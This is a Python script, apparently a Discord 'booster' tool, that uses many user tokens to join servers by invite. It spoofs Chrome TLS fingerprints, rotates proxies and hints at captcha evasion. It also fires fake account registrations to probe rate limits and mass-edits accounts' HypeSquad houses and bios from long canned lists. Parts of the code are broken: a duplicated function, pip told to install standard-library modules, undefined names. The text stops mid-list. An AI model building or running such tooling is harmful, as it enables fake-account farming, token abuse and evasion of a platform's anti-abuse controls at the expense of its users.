def install_requirements():
    required_packages = [
        'colorama',
        'requests',
        'pyautogui',
        'keyboard',
        'wmi',
        'tls_client',
        'hashlib',
        'random',
        'datetime',
        'os',
        'sys',
        'subprocess',
        'string',
        'time',
        'logging'
    ]
    
    print(f"{Fore.BLUE}[INFO]{Fore.YELLOW} Checking required packages...{Style.RESET_ALL}")
    
    for package in required_packages:
        try:
            pkg_resources.require(package)
        except (pkg_resources.DistributionNotFound, pkg_resources.VersionConflict):
            print(f"{Fore.BLUE}[INFO]{Fore.YELLOW} Installing {package}...{Style.RESET_ALL}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
            print(f"{Fore.BLUE}[INFO]{Fore.GREEN} Successfully installed {package}{Style.RESET_ALL}")

import tls_client
import os
import logging
import sys
import subprocess
import pkg_resources
import colorama
from colorama import init, Fore, Style
import requests
import string
import json
import pyautogui
import time
import datetime
import random
import hashlib
import wmi
import keyboard
from typing import Optional, Dict
import itertools

PROXY_FILE = "proxiex.txt"
proxies = []
proxy_cycle = None

def load_config():
    try:
        with open("config.json") as f:
            return json.load(f)
    except FileNotFoundError:
        default_config = {
            "humanizer": True,
            "non_cap_maker": True,
            "server_invite_code": ""
        }
        with open("config.json", "w") as f:
            json.dump(default_config, f, indent=4)
        return default_config

# Replace your existing config loading
Config = load_config()

pronouns = [
    'They/them', 'She/her', 'He/him', 'Ze/hir', 'Ey/em', 'Xe/xem', 'Ve/ver', 'Per/pers', 'Ne/nem', 'Fae/faer', 
    'E/em', 'Co/cos', 'Mx/mx', 'Thon/thons', 'Spivak/spivak', 'Ze/hirs', 'Zie/hir', 'Sie/hir', 'He/she/they', 
    'He/they', 'She/they', 'They/she', 'They/he', 'He/she', 'He/xe', 'She/xe', 'They/xe', 'Eir/eirs', 'Xe/xyr', 
    'Zie/zir', 'Ze/zir', 'Ey/eirs', 'Co/coself', 'Mx/mxself', 'Thon/thonself', 'Ve/verself', 'Ne/nemself', 
    'Fae/faerself', 'E/emself', 'Kit/kitself', 'Vae/vaerself', 'Xem/xemself', 'Spivak/spivakself', 'He/it', 
    'She/it', 'They/it', 'It/it', 'It/its', 'Itself/itself', 'One/oneself', 'One/one', 'Jhe/jhes', 'Jhe/jhem', 
    'Jhe/jhemself', 'Yo/yo', 'Yo/yos', 'Yo/yoself', "Yo/yoself's", 'Jhi/jhim', 'Jhi/jhimself', 'Ve/vir', 
    'Ve/virs', 'Ve/virself', 'Fey/fem', 'Fey/femself', 'Tey/ter', 'Tey/terself', 'Fey/feyr', 'Fey/feyrs', 
    'Fey/feyrself', 'Fey/feyrs', 'Fey/feyrself', "Fey/feyrself's", 'Zie/zies', "Zie/zie's", 'Zie/zieself', 
    "Mx/mx's", "Mx/mxself's", 'Tey/tem', 'Tey/temself', "Tey/tem's", "Tey/temself's", 'Tey/ters', 'Tey/terself', 
    "Tey/ters'", "Tey/terself's", "Co/cos'", "Co/coself's", "Co/co's", "Co/coself's", 'Co/coselves', "Mx/mx's", 
    "Mx/mx's", "Mx/mxself's", "Mx/mx's", "Spivak/spivak's", "Spivak/spivakself's", 'Spivak/spivaks', 
    "Spivak/spivakself's", "E/em's", "E/emself's", "E/em's", "E/emself's", "Ve/ver's", "Ve/verself's", "Ne/nem's", 
    "Ne/nemself's", "Ne/nem's", "Ne/nemself's", "Fae/faer's", "Fae/faerself's", 'Fae/faes', "Fae/faeself's", 
    "Xe/xem's", "Xe/xemself's", "Ze/zer's", "Ze/zerself's", "Ze/ze's", "Ze/zerself's", 'Ze/zes', "Ze/zeself's", 
    "Xe/xyr's", "Xe/xyrself's", "Xe/xir's", "Xe/xirself's", 'Xe/xis', "Xe/xiself's", "Zie/zir's", 
    "Zie/zirself's", "Zie/zieself's", 'Zie/zies', "Zie/zieself's", "Ey/eir's", "Ey/eirself's", 'Ey/eirs', 
    "Ey/eirs's", 'Ey/eirs', "Ey/eirs's", 'They/them/theirs', 'They/themself', 'They/them/theirself', 
    "They/them/their's", 'They/themselves', "They/them's", "They/themself's", "They/them/their's", 
    "They/themselves's", 'She/her/hers', 'She/herself', "She/her/herself's", "She/herself's", "She/her's", 
    "She/herself's", 'She/hers', "She/herself's", "She/her/herself's", 'He/him/his', 'He/himself', 
    'He/him/hisself', 'He/his', "He/himself's", "He/himself's", "He/him's", "He/himself's", 
    "He/him/hisself's", 'She/they/their', 'She/they/theirself', "She/they/their's", 'She/they/themself', 
    "She/they/themself's", "She/they/them's", 'She/they/themselves', "She/they/themself's", 
    "She/they/themself's", 'They/she/her', 'They/she/hers', 'They/she/herself', "They/she/herself's", 
    'They/she/his', 'They/she/hisself', "They/she/hisself's", "They/she/hisself's", "They/she/hisself's", 
    "They/she/himself's", "They/she/himself's", "They/she/hisself's", 'He/she/they', 'He/she/them', 
    'He/she/themself', "He/she/themself's", 'He/she/their', 'He/she/theirself', "He/she/theirself's", 
    "He/she/theirself's", "He/she/themself's", "He/she/themself's", "He/she/themself's", 
    "He/she/themself's", "He/she/themself's", "He/she/themself's"
]

names = [
    "Aaban", "Aaberg", "Aaccf", "Aadam", "Aadan", "Aadarsh", "Aaden", "Aadhav", "Aadhini", "Aadhira",
    "Aadhiran", "Aadhvik", "Aadhya", "Aadi", "Aadil", "Aadin", "Aadit", "Aaditya", "Aadvik", "Aadya",
    "Aadyn", "Aahan", "Aahana", "Aahil", "Aahna", "Aaiden", "Aaima", "Aaira", "Aairah", "Aakash",
    "Aalam", "Aalani", "Aalaya", "Aalayah", "Aaleah", "Aaleyah", "Aalia", "Aaliah", "Aalijah", "Aaliya",
    "Aaliyah", "Aaliyha", "Aalliyah", "Aalst", "Aalyah", "Aalyiah", "Aamani", "Aamina", "Aaminah", "Aamir",
    "Aamira", "Aamirah", "Aamiyah", "Aamori", "Aanav", "Aanchal", "Aanika", "Aaniya", "Aaniyah", "Aanshi",
    "Aanvi", "Aanya", "Aara", "Aaradhya", "Aaralyn", "Aaralynn", "Aarav", "Aaren", "Aaria", "Aariah",
    "Aarian", "Aariana", "Aaric", "Aarik", "Aarika", "Aarin", "Aarini", "Aarion", "Aarish", "Aariv",
    "Aariya", "Aariyah", "Aariz", "Aarna", "Aarnav", "Aarnik", "Aarohi", "Aaron", "Aaronjames",
    "Aaronjoshua", "Aaronmichael", "Aaronson", "Aarron", "Aarti", "Aartjan", "Aarush", "Aarushi", "Aarvi",
    "Aarvik", "Aarya", "Aaryan", "Aaryav", "Aaryn", "Aasha", "Aashi", "Aashir", "Aashna", "Aashritha",
    "Aashvi", "Aasia", "Aasim", "Aasir", "Aasiya", "Aasiyah", "Aastha", "Aava", "Aavya", "Aavyan",
    "Aayan", "Aayansh", "Aayat", "Aayden", "Aayla", "Aayra", "Aayush", "Aayushi", "Ab", "Aba",
    "Abad", "Abagael", "Abagail", "Abagayle", "Abahri", "Abaigeal", "Abana", "Abanoub", "Abate",
    "Abayomi", "Abba", "Abbagail", "Abbas", "Abbate", "Abbe", "Abbey", "Abbi", "Abbie", "Abbiegail",
    "Abbigail", "Abbigale", "Abbigayle", "Abbot", "Abbotsen", "Abbotson", "Abbotsun", "Abbott", "Abbottson",
    "Abby", "Abbye", "Abbygail", "Abbygale", "Abbygayle", "Abcde", "Abdalla", "Abdallah", "Abdel", "Abdella",
    "Abdelrahman", "Abdi", "Abdias", "Abdiaziz", "Abdiel", "Abdifatah", "Abdikadir", "Abdimalik", "Abdinasir",
    "Abdiqani", "Abdirahim", "Abdirahman", "Abdirizak", "Abdishakur", "Abdo", "Abdon", "Abdou", "Abdoul",
    "Abdoulaye", "Abdoulie", "Abdu", "Abdul", "Abdulahad", "Abdulahi", "Abdulai", "Abdulaziz", "Abdulkarim",
    "Abdulla", "Abdullah", "Abdullahi", "Abdulloh", "Abdulmalik", "Abdulrahman", "Abdur", "Abdurahman", "Abdurrahman",
    "Abe", "Abebi", "Abeeha", "Abeer", "Abegail", "Abel", "Abelard", "Abelardo", "Abelina", "Abelino",
    "Abell", "Abella", "Abena", "Abenezer", "Abeni", "Abercromby", "Aberdeen", "Abernathy", "Abernon", "Abert",
    "Abeu", "Abey", "Abhay", "Abhi", "Abhijot", "Abhimanyu", "Abhinav", "Abhiram", "Abhishek", "Abi",
    "Abid", "Abie", "Abiel", "Abigael", "Abigaelle", "Abigail", "Abigaile", "Abigal", "Abigale", "Abigayl",
    "Abigayle", "Abiha", "Abijah", "Abilene", "Abimael", "Abiola", "Abir", "Abisai", "Abisha", "Abisia",
    "Abixah", "Able", "Abner", "Aborn", "Abott", "Abou", "Aboubacar", "Aboubakar", "Abra", "Abraham",
    "Abrahams", "Abrahamsen", "Abrahan", "Abrahim", "Abrahm", "Abram", "Abramo", "Abrams", "Abramson", "Abran",
    "Abrar", "Abreanna", "Abree", "Abrham", "Abri", "Abria", "Abrian", "Abriana", "Abrianna", "Abrie",
    "Abriel", "Abriella", "Abrielle", "Abril", "Abrina", "Abrish", "Abroms", "Abron", "Absa", "Absalom",
    "Abshier", "Absidy", "Abu", "Abubakar", "Abubakr", "Abundio", "Aby", "Abyan", "Abygail", "Abygale",
    "Acacia", "Acadia", "Acalia", "Accalia", "Access", "Accounting", "Ace", "Acelin", "Acelyn", "Acelynn",
    "Acen", "Acencion", "Aceson", "Acey", "Aceyn", "Achal", "Achamma", "Acherman", "Achille", "Achilles",
    "Achorn", "Acie", "Aciel", "Acima", "Ackeem", "Acker", "Ackerley", "Ackerman", "Ackler", "Ackley",
    "Acquah", "Acsa", "Action", "Acus", "Acxel", "Acy", "Ad", "Ada", "Adabel", "Adabella", "Adabelle",
    "Adachi", "Adael", "Adaeze", "Adah", "Adaha", "Adahli", "Adahlia", "Adai", "Adaia", "Adaiah", "Adaiha",
    "Adain", "Adair", "Adal", "Adala", "Adalae", "Adalai", "Adalaide", "Adalard", "Adalay", "Adalbert",
    "Adalberto", "Adaleah", "Adalee", "Adaleen", "Adaleigh", "Adalena", "Adalene", "Adaley", "Adalheid",
    "Adalhi", "Adali", "Adalia", "Adaliah", "Adalid", "Adalida", "Adalie", "Adalin", "Adalina", "Adalind",
    "Adaline", "Adaliz", "Adall", "Adallard", "Adaly", "Adalyn", "Adalyna", "Adalyne", "Adalynn", "Adalynne",
    "Adam", "Adama", "Adamari", "Adamaris", "Adamariz", "Adamary", "Adamarys", "Adamec", "Adamek", "Adamik",
    "Adamina", "Adaminah", "Adamis", "Adamo", "Adamok", "Adams", "Adamsen", "Adamski", "Adamson", "Adamsun",
    "Adan", "Adana", "Adanelly", "Adanely", "Adanna", "Adanya", "Adao", "Adaora", "Adar", "Adara", "Adarian",
    "Adarius", "Adarsh", "Adaurd", "Aday", "Adaya", "Adayah", "Adda", "Addalie", "Addaline", "Addalyn",
    "Addalynn", "Addam", "Addeline", "Addelyn", "Addelynn", "Addi", "Addia", "Addie", "Addiego", "Addiel",
    "Addilyn", "Addilynn", "Addis", "Addisen", "Addison", "Addisson", "Addisyn", "Addisynn", "Addons", "Addy",
    "Addysen", "Addyson", "Ade", "Adebayo", "Adedamola", "Adeeb", "Adeel", "Adeena", "Adel", "Adela",
    "Adelai", "Adelaida", "Adelaide", "Adelaido", "Adelaine", "Adelaja", "Adelard", "Adelayda", "Adelbert",
    "Adele", "Adeleine", "Adelena", "Adelene", "Adelfa", "Adelfina", "Adelheid", "Adelia", "Adelice",
    "Adelie", "Adelin", "Adelina", "Adelind", "Adeline", "Adelino", "Adelisa", "Adelise", "Adelita", "Adell",
    "Adella", "Adelle", "Adelmira", "Adelpho", "Adelric", "Adely", "Adelyn"
]

def install_requirements():
    required_packages = [
        'colorama',
        'requests',
        'pyautogui',
        'keyboard',
        'wmi',
        'tls_client'
    ]
    
    print(f"{Fore.BLUE}[INFO]{Fore.YELLOW} Checking required packages...{Style.RESET_ALL}")
    
    for package in required_packages:
        try:
            pkg_resources.require(package)
        except (pkg_resources.DistributionNotFound, pkg_resources.VersionConflict):
            print(f"{Fore.BLUE}[INFO]{Fore.YELLOW} Installing {package}...{Style.RESET_ALL}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
            print(f"{Fore.BLUE}[INFO]{Fore.GREEN} Successfully installed {package}{Style.RESET_ALL}")

try:
    import colorama
    from colorama import init, Fore, Style
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama", "--quiet"])
    import colorama
    from colorama import init, Fore, Style

init()

class Booster:
    def __init__(self):
        self.client = tls_client.Session(
            client_identifier="chrome112",
            random_tls_extension_order=True
        )
        self.tokens = []
        self.proxies = []
        self.failed = []
        self.success = []
        self.captcha_solved = []
        self.captcha_unsolved = []
        self.failed_tokens = []
    

    def headers(self, token: str):
        headers = {
            'authority': 'discord.com',
            'accept': '*/*',
            'accept-language': 'it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': token,
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/channels/@me',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'x-context-properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjExMDQzNzg1NDMwNzg2Mzc1OTEiLCJsb2NhdGlvbl9jaGFubmVsX2lkIjoiMTEwNzI4NDk3MTkwMDYzMzIzMCIsImxvY2F0aW9uX2NoYW5uZWxfdHlwZSI6MH0=',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-GB',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6Iml0LUlUIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEyLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE5MzkwNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
        }
        return headers
    

    def get_cookies(self):
        cookies = {}
        try:
          response = self.client.get('https://discord.com')
          for cookie in response.cookies:
            if cookie.name.startswith('__') and cookie.name.endswith('uid'):
                cookies[cookie.name] = cookie.value
          return cookies
        
        except Exception as e:
          logging.info('Failed to obtain cookies ({})'.format(e))
          return cookies


    

    def join(self, token, invite):
        tkv = token[:-25] + "*" * 8
        headers = self.headers(token)
        payload = {
            'session_id': ''.join(random.choice(string.ascii_lowercase) + random.choice(string.digits) for _ in range(16))
        }
        r = None
        while r is None or r.status_code != 200:
            
            r = self.client.post(
                url='https://discord.com/api/v9/invites/{}'.format(invite),
                headers=self.headers(token=token),
                json=payload,
                cookies=self.get_cookies(),
            )
            time.sleep(2)
        return 2 


def timestamp():
    return f"{Fore.MAGENTA}[{datetime.datetime.now().strftime('%H:%M:%S %d-%m-%Y')}]{Fore.RESET}"

print(f"{timestamp()}{Fore.BLUE}[INFO]{Fore.YELLOW} Checking and installing required packages...{Style.RESET_ALL}")
install_requirements()
print(f"{timestamp()}{Fore.BLUE}[INFO]{Fore.GREEN} All required packages are installed!{Style.RESET_ALL}")

def account_ratelimit():
    try:
        m = format(''.join(random.choice(string.digits) for _ in range(6)))
        email = format(''.join(random.choice(string.ascii_lowercase) for _ in range(9)))+m
        mail = "{}@gmail.com".format(''.join(random.choice(string.ascii_lowercase) for _ in range(11)))
        nam = "ultimate"
        
        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/json",
            "DNT": "1",
            "Host": "discord.com",
            "Origin": "https://discord.com",
            "Referer": 'https://discord.com/register',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Sec-GPC": "1",
            "TE": "trailers",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Calcutta",
            "X-Super-Properties": 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIEZyYW1lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImdyLUFSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgOC4wOyBXaW5kb3dzIE5UIDYuMTsgVHJpZGVudC80LjA7IEdUQjcuNDsgY2hyb21lZnJhbWUvMjQuMC4xMzEyLjU3OyBTTENDMjsgLk5FVCBDTFIgMi4wLjUwNzI3OyAuTkVUIENMUiAzLjUuMzA3Mjk7IC5ORVQgQ0xSIDMuMC4zMDcyOTsgLk5FVDQuMEM7IEluZm9QYXRoLjM7IE1TLVJUQyBMTSA4OyBCUkkvMikiLCJicm93c2VyX3ZlcnNpb24iOiIyNC4wLjEzMTIiLCJvc192ZXJzaW9uIjoiNyIsInJlZmVycmVyIjoiaHR0cHM6Ly93d3cueW91dHViZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbiI6Ind3dy55b3V0dWJlLmNvbSIsInNlYXJjaF9lbmdpbmUiOiJhc2suY29tIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE0ODQ3OSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',
        }
        
        data = {
            'email': mail,
            'password': 'ultimate12$$',
            'date_of_birth': "2000-09-20",
            'username': email,
            'consent': True,
            'captcha_service': 'hcaptcha',
            'global_name': nam,
            'captcha_key': None,
            'invite': None,
            'promotional_email_opt_in': False,
            'gift_code_sku_id': None
        }
        
        req = requests.post(f'https://discord.com/api/v9/auth/register', json=data, headers=headers)
        if 'The resource is being rate limited' in req.text:
            limit = req.json()['retry_after']
            return limit
        else:
            return 1
    except Exception as e:
        print(f'{Fore.BLUE}+"[INFO]"+{Fore.RED} Error fetching rate limit: {str(e)}')

def get_firefox_path():
    possible_paths = [
        r"C:\Program Files\Mozilla Firefox\firefox.exe",
        r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
        os.path.expanduser("~") + r"\AppData\Local\Mozilla Firefox\firefox.exe"
    ]
    
    for path in possible_paths:
        if os.path.exists(path):
            return path
            
    print(f"{timestamp()}{Fore.RED}[ERROR] Firefox not found! Please install Firefox browser.{Style.RESET_ALL}")
    print(f"{timestamp()}{Fore.YELLOW}[INFO] You can download Firefox from: https://www.mozilla.org/firefox{Style.RESET_ALL}")
    input("Press Enter to exit...")
    sys.exit(1)

def get_chrome_path():
    possible_paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\Application\chrome.exe"
    ]
    
    for path in possible_paths:
        if os.path.exists(path):
            return path
            
    print(f"{timestamp()}{Fore.RED}[ERROR] Chrome not found! Please install Chrome browser.{Style.RESET_ALL}")
    print(f"{timestamp()}{Fore.YELLOW}[INFO] You can download Chrome from: https://www.google.com/chrome{Style.RESET_ALL}")
    input("Press Enter to exit...")
    sys.exit(1)

class Changer:
    def __init__(self):
        self.cookies = self.get_discord_cookies()
    def Headers(self, token):
        return {
            'authority': 'discord.com',
            'accept': '*/*',
            'accept-language': 'en',
            'cookie': self.cookies,
            'authorization': token,
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9030 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-discord-timezone': 'Europe/Warsaw',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDMwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6InBsIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMzAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTkwNDgsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjQyNjU2LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJkZXNpZ25faWQiOjB9',
        }
    
    def get_discord_cookies(self):
        response = requests.get("https://canary.discord.com")
        match response.status_code:
            case 200:
                return "; ".join(
                    [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
                ) + "; locale=en-US"
            case _:
                return "__dcfduid=4e0a8d504a4411eeb88f7f88fbb5d20a; __sdcfduid=4e0a8d514a4411eeb88f7f88fbb5d20ac488cd4896dae6574aaa7fbfb35f5b22b405bbd931fdcb72c21f85b263f61400; __cfruid=f6965e2d30c244553ff3d4203a1bfdabfcf351bd-1699536665; _cfuvid=rNaPQ7x_qcBwEhO_jNgXapOMoUIV2N8FA_8lzPV89oM-1699536665234-0-604800000; locale=en-US"

    def Add_HypeSquad(self, token):
        headers = self.Headers(token)
        data = {
            'house_id': random.randint(1, 3),
        }

        response = session.post("https://discord.com/api/v9/hypesquad/online", headers=headers, json=data)

        match response.status_code:
            case 204:
                print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.GREEN}" + f" [+] Added HypeSquad {token[:20]}")
            case _:
                print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.RED} [-] Failed adding HypeSquad {token[:25]}"+"***",{response.json()})
    
    def Add_Bio(self, token):
        headers = self.Headers(token)
        biolist = ['Love is all you want.', 'Wake me after you need me.', 'only 1 additional game.', 'twiddling with the large boys now.', 'Finally opened our own server!', 'Had to create a brand new one as a result of the previous one was obtaining too popular…', 'Buckeye State no, not again!', 'better of all you die like everybody else', 'i’ll play a game ahead of me.', 'Don’t run faraway from challenges, run over them.', 'house is wherever the sphere is.', 'All punts are extremely intended.', 'Are you prepared for a few football?', 'Hey! Look! Listen!', 'You were nearly a Jill sandwich!', 'I actually have over my struggle, and that i need to live.', 'Wake ME after you need me.', 'Nothing is additional badass than treating a girl with respect.', 'It isn’t continuously going to be helpful, however consistently attempt to make the wisest decision.', 'Effortlessness is the way to bliss.', 'I never lose, Either I win or I learn.', 'My life, my standard, that is my demeanor.', 'No one but I can change my own life.', 'My critics are my greatest inspirations.', 'Hope is that the solely issue stronger than fear.', 'i’m pretty a giant gamer', 'simply 5 minutes more….', 'Champions keep taking part in till they win.', 'speak soccer to me.', 'we tend to are the champions, my friend.', 'I have ninety nine issues, however our team isn’t alone.', 'Parachute for sale, used once, ne’er opened!', 'legendary creature saw me yesterday, however nobody believes him.', 'gambling isn’t a crime.', 'If I can’t notice them, i’ll fight them', 'better of all you die like everybody else', 'I’m not on the market as a result of I’m in an exceedingly game that isn’t available.', 'it’s higher to die than to face on your knees.', 'Try not to pass judgment on me, you don’t have a clue about my story.', 'I’m excessively great for you.', 'I’m so normally entertaining on the grounds that my life resembles a joke.', 'I may not be awesome, yet I know that dislike rest.', 'Companions who kill together stay together.', 'It was generally difficult however it’s worth the effort.', 'Gamers don’t concern the apocalypse.', 'Eat, Sleep, Play repeat.', 'sensible is not good once better is expected.', 'creating friends discord server', 'cooperation makes the dream work.', 'we tend to are more durable than your team.', 'we tend to are the champions, my friend.', 'i’ll play once the sport is ahead of me.', 'Hey! Look! Listen!', 'Why walk after you will ride?', 'Love is simply chemistry. we offer it by choice.', 'I still play games, have an honest time.', 'Play each game like your predecessor.', 'The stronger you press the buttons, The stronger the attack is.', 'Progress, Demands, Sacrifice – unknown Lost Legacy.', 'My brain is 90% gaming, techniques and 10% random stuffs.', 'I don’t have to be compelled to get a life, i’m a gamer, I actually have millions of lives.', 'Life Is A Game. cash Is however we tend to Keep Score.', 'I detected You’Re A Player. Nice to fulfill You. I’M The Coach.', 'pride oneself in your work, notwithstanding its not the prettiest.', 'Gamers don’t concern the apocalypse.', 'gratuitous to say, no one is born a fanatical gamer.', 'Don’t run faraway from challenges, run over them.', 'try this game, one snack at a time.', 'we tend to are the champions, my friend.', 'Everything has excellence however not every person can see.', 'In a world brimming with patterns I need to stay a work of art.', 'Likely the most skilled TV watcher you’ll at any point find.', 'I’m cool, however an Earth-wide temperature boost made me HOT.', 'He transformed his cants into jars and ready for his fantasies.', 'My mentality is high then your level.', 'I’m enamored with myself, with my heart.', 'Champs never stopped, Quitters won’t ever win.', 'Today’s forecast: one hundred pc likelihood of winning.', 'a person wanting off a geological formation at a colossal depression below him', 'I create deliveries, That’s all.', 'AI isn’t any match for natural stupidity.', 'Life is beautiful… from Fri to weekday', 'Why do individuals use away messages? They’re therefore stupid!', 'Genius By Birth, Evil By Choice.', 'I sleep in a virtual world … don’t hassle me!', 'If you fail to prepare, you’re ready to fail.', 'the sole thanks to prove that you just are an honest player.', 'I’m in an exceedingly serious relation-chip.', 'Today’s prediction: one hundred pc likelihood of winning.', 'Wangsheng funeral chapel Discord.', 'Hope is that the only issue stronger than fear.', 'you’ve got died of dysentery.', 'after you aren’t seeing, you’ve got a foul dream habit.', 'Don’t worry, brewage happy.', 'I don’t have to be compelled to get a life, i’m a gamer, I actually have millions of lives.', 'This game is completely aiming to guac my world.', 'we tend to fall infatuated by chance, we keep in love by choice.', 'Your smile is that the cutest issue ever.', 'Stop checking my status! Go get a life.', 'we tend to are the champions, my friend.', 'That penalty was a tortilla chip problem.', 'I’m not immature; I simply shrewdness to possess fun', 'I don’t have to be compelled to live life, there’s plenty of life within the game.', 'Don’t Blame Me, i used to be Born Awesome.', 'I’m right 90% of the time, therefore why worry regarding the opposite 3%?', 'Some individuals simply want a gesture on the face', 'sensible ladies are dangerous girls that ne’er get caught.', 'The longer the title the reduced the job.', 'I would like it wasn’t easy, I wish you were better.', 'Set your goals high, and don’t stop until you get there.', 'Judge me when you’re awesome.', 'Innovativeness settles everything.', 'Bliss never becomes unpopular.', 'Making my own daylight.', 'I would rather not fail to remember something that once made us grin.', 'Quiet individuals will quite often have the most intense personalities.', '5’2 is my level however my mentality is 6’1.', 'Simply one more paper cut survivor.', 'We have nothing to fear except for dread itself.', 'That penalty was tortilla chip problem.', 'i favor big punts and that i cannot lie.', 'we tend to tailgate tougher than your team plays.', 'This game is completely aiming to guac my world.', 'i’m a suppose gamer with twitch tendencies.', 'i’m not a player, i’m a gamer.', 'If there’s nothing in chest, a chest doesn’t mean anything.', 'Parachute for sale, used once, ne’er opened!', 'Dear, quarterback. I’m wingin’ it, however you shouldn’t.', 'i favor massive punts and that i cannot lie.', 'i’m not a nerd. i’m simply smarter than you.', 'I created a would like and you came true.', 'Make sure to constantly act naturally.', 'Gifted napper, talker, and frozen yogurt eater.', 'For what reason is “shortened form” a long word?', 'I bet you I could quit betting.', 'God is truly inventive. At the end of the day, simply check me out.', 'Disunity bio presently stacking.', 'Go to where you feel generally invigorated.', 'Take recollections, leave impressions.', 'Try not to stand by listening to what they say, go see.', 'I’ve fallen infatuated again and again however forever with you.', 'you’re thinking that you’ll beat us? currently that’s fantasy football.', 'knowledge is that the offspring of suffering and time.', 'All punts are extremely intended.', 'Love is simply chemistry. we offer it by choice.', 'You were nearly a Jill sandwich!', 'it’s higher to die than to face on your knees.', 'Don’t let things crawl on you, mount up it.', 'You’re nice on your team … and I’m amazing.', 'My team extremely wants ketchup.', 'You’ve had a terrible end, haven’t you?', 'Have I ever told you what madness MEans?', 'I Play Some Fighting Games, however largely I simply Play Sports.', 'Love could be a Game That 2 will Play And each Win.', 'knowledge is that the offspring of suffering and time.', 'Be in with no reservations or get out. There is in the middle between.', 'Love me or disdain me, in any case, I will sparkle.', 'I’m the young lady you can merely fantasize about and never get!', 'I’m a restricted release, there’s just a single me.', 'My guidelines are high… very much like my heels.', 'Having faith in making the unthinkable conceivable.', 'My leisure activities are breakfast, lunch, and supper.', 'What do you call a cow without any legs? Ground meat.', 'I may lie and tell you i’m a hardcore gamer, I’m not.', 'If I cannot outsmart them, i’ll beat out them.', 'It feels sensible to be lost in 